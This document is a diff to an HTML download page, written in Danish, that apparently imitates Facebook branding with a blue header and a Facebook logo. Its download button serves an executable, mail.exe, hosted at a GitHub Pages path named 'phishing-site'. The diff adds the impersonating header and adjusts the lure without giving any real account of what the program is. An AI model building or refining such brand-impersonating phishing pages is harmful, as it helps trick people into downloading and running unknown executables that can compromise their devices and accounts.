@@ -10,10 +10,20 @@
             background-color: #f0f2f5;
             margin: 0;
             padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        }
+
+        .header {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 10px;
+            text-align: center;
+        }
+
+        .header img {
+            width: 40px;
+            height: 40px;
+            vertical-align: middle;
+            margin-right: 10px;
         }
 
         .container {
@@ -22,6 +32,7 @@
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             text-align: center;
+            margin-top: 20px;
         }
 
         h1 {
@@ -47,24 +58,16 @@
         .download-button:hover {
             background-color: #0e5a8a;
         }
-
-        .facebook-icon {
-            display: inline-block;
-            width: 30px;
-            height: 30px;
-            background-image: url('facebook-icon.png');
-            background-size: cover;
-            vertical-align: middle;
-            margin-right: 10px;
-        }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="header">
+        <img src="facebook-logo.png" alt="Facebook Logo">
         <h1>Velkommen til vores download-side</h1>
+    </div>
+    <div class="container">
         <p>Klik på knappen nedenfor for at downloade vores fantastiske program:</p>
-        <a href="https://rodehoved123.github.io/phishing-site/mail.exe" download="program.exe" class="download-button">
-            <span class="facebook-icon"></span>
+        <a href="https://rodehoved123.github.io/phishing-site/mail.exe" download="mail.exe" class="download-button">
             Download Program
         </a>
     </div>
